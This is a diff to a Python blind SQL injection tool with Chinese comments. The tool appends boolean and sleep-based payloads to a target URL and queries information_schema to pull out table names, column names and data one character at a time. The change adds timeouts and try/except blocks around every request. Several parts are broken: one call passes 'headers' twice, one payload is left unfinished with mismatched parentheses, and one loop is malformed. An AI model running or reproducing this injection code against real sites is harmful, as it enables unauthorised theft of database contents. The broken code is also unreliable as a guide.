@@ -72,11 +72,14 @@ class SQL():
             X="{0} and if(length({1})={2},{3},1) %23".format(self.url,data,i,self.check_way)
             #print(X)
             time.sleep(0.1)
-            res=requests.get(X,headers=headers)
-            dum=requests.get(X,headers={'Connection':'close'})   #关闭网络流
-            #print(res.text)
-            if self.Check(res.text):         #传入判断
-                return i
+            try:
+                res=requests.get(X,headers=headers,timeout=3.0)      #超时设置
+                dum=requests.get(X,headers={'Connection':'close'},timeout=1.0)   #关闭网络流
+                #print(res.text)
+                if self.Check(res.text):         #传入判断
+                    return i
+            except:
+                pass
 
 
 
@@ -94,12 +97,14 @@ class SQL():
                 X = "{0} and IF((select length({3}) from information_schema.{4} where table_schema=database() limit {1} ,1)={2},{5},1) %23".format(
                     self.url, i, j,data,table,self.check_way)
                 time.sleep(0.1)
-                res = requests.get(X, headers=headers)
-                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                if self.Check(res.text):     #传入判断
-                    length.append(j)
-                    break
-
+                try:
+                    res = requests.get(X, headers=headers,timeout=5.0)
+                    dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                    if self.Check(res.text):     #传入判断
+                        length.append(j)
+                        break
+                except:
+                    pass
 
 
     def BurpChars(self,data,length):
@@ -115,12 +120,15 @@ class SQL():
             for j in range(32,127):
                 X = "{0} and IF(ascii(substr({1},{2},1))={3},{4},1) %23".format(self.url, data, i, j,self.check_way)
                 time.sleep(0.1)
-                res = requests.get(X, headers=headers)
-                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                if self.Check(res.text):      #传入判断
-                    x.append(chr(j))
-                    break
-        x="".join(x)                        # list>>str
+                try:
+                    res = requests.get(X, headers=headers,timeout=3.0)
+                    dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                    if self.Check(res.text):      #传入判断
+                        x.append(chr(j))
+                        break
+                except:
+                    pass
+        x="".join(x)                          # list>>str
         return x
 
 
@@ -141,10 +149,13 @@ class SQL():
                 for j in range(32,127):
                     X="{0} and IF((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{1},1)={2},{3},1)%23".format(self.url,l,j,self.check_way)
                     time.sleep(0.1)
-                    res = requests.get(X, headers=headers)
-                    dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                    if self.Check(res.text):        #传入判断
-                        m.append(chr(j))
+                    try:
+                        res = requests.get(X, headers=headers,timeout=3.0)
+                        dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                        if self.Check(res.text):        #传入判断
+                            m.append(chr(j))
+                    except:
+                        pass
             n.append(m)
             m=''
         return n
@@ -165,11 +176,14 @@ class SQL():
                 X = "{0} and IF((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit {1} ,1)={2},{3},1) %23".format(
                     self.url, i, j, self.str_to_hex(table),self.check_way)
                 time.sleep(0.1)
-                res = requests.get(X, headers=headers)
-                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                if self.Check(res.text):     #传入判断
-                    length.append(j)         # list拼接
-                    break
+                try:
+                    res = requests.get(X, headers=headers,headers=3.0)
+                    dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                    if self.Check(res.text):     #传入判断
+                        length.append(j)         # list拼接
+                        break
+                except:
+                    pass
 
         m = []  # 存储当前字母
         n = []  # 存储当前完整结果
@@ -180,10 +194,13 @@ class SQL():
                     X = "{0} and IF((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name={3} limit 0,1),{1},1)={2},{4},1)%23".format(
                         self.url, l, j,self.str_to_hex(table),self.check_way)
                     time.sleep(0.1)
-                    res = requests.get(X, headers=headers)
-                    dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                    if self.Check(res.text):   #传入判断
-                        m.append(chr(j))       #拼接字母
+                    try:
+                        res = requests.get(X, headers=headers,timeout=3.0)
+                        dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                        if self.Check(res.text):   #传入判断
+                            m.append(chr(j))       #拼接字母
+                    except:
+                        pass
             n.append(m)                        #名称拼接入list
             m = ''                             #临时存储点置空
         return n
@@ -200,11 +217,14 @@ class SQL():
                 X="{0} and IF(ascii(select {1} from {2} limit 0,1),{3},1))={4},{5},1) %23".format(self.url,column,"table","length",j,self.check_way)
                 # 上式未完成，table，length
                 time.sleep(0.1)
-                res = requests.get(X, headers=headers)
-                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                if self.Check(res.text):     #传入判断
-                    data.append(i)  # 存储各列数据入list
-                    break
+                try:
+                    res = requests.get(X, headers=headers,timeout=3.0)
+                    dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                    if self.Check(res.text):     #传入判断
+                        data.append(i)  # 存储各列数据入list
+                        break
+                except:
+                    pass
 
 
 
@@ -240,11 +260,14 @@ class SQL():
                 X="{0} and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name={2})={1},{3},1) %23".format(self.url,i,self.str_to_hex(table),self.check_way)  #获取表数量
                 # print(X)
                 time.sleep(0.1)
-                res = requests.get(X, headers=headers)
-                dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                if self.Check(res.text):                      #传入判断
-                    num_columns.append(i)                     #存储各表中列数量
-                    break
+                try:
+                    res = requests.get(X, headers=headers,timeout=3.0)
+                    dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                    if self.Check(res.text):                      #传入判断
+                        num_columns.append(i)                     #存储各表中列数量
+                        break
+                except:
+                    pass
 
 
         for num,table in num_columns,tables:                   #依次获取表的列数量及名称
@@ -255,11 +278,14 @@ class SQL():
                         X = "{0} and IF((select length({3}) from information_schema.columns where table_schema=database() and table_name={4} limit {1} ,1)={2},sleep(5),1) %23".format(
                             self.url, i, j, "column_name",self.str_to_hex(table))
                         time.sleep(0.1)
-                        res = requests.get(X, headers=headers)
-                        dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-                        if self.Check(res.text):                #传入判断
-                            length.append(j)
-                            break
+                        try:
+                            res = requests.get(X, headers=headers,timeout=3.0)
+                            dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                            if self.Check(res.text):                #传入判断
+                                length.append(j)
+                                break
+                        except:
+                            pass
 
 
                 for l in length:
@@ -294,11 +320,14 @@ class SQL():
             X="{0} and if((select count(table_name) from information_schema.tables where table_schema=database())={1},sleep(5),1) %23".format(self.url,i)  #获取表数量
             # print(X)
             time.sleep(0.1)
-            res = requests.get(X, headers=headers)
-            dum = requests.get(X, headers={'Connection': 'close'})  # 关闭网络流
-            if self.Check(res.text):
-                self.number_tables=i                     #表数量
-                break
+            try:
+                res = requests.get(X, headers=headers,timeout=3.0)
+                dum = requests.get(X, headers={'Connection': 'close'},timeout=1.0)  # 关闭网络流
+                if self.Check(res.text):
+                    self.number_tables=i                     #表数量
+                    break
+            except:
+                pass
 
         self.Tables=self.BurpTables(self.number_tables)       #接收表名称的list
         self.GuessColumns(self.Tables)
